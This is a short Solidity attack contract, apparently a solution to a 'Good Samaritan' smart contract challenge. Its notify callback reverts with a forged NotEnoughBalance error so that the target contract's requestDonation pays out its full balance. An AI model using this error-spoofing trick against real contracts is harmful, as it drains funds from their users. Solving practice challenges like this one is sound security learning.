// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "./GoodSamartian.sol";

contract GoodSamartianAttack {
    GoodSamaritan target = GoodSamaritan(0x42Fa02DF9626A616befD0E5915612CDe248D4E17);

    error NotEnoughBalance();

    function notify(uint256 _amount) external pure {
        if (_amount < 11) {
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        target.requestDonation();
    }
}
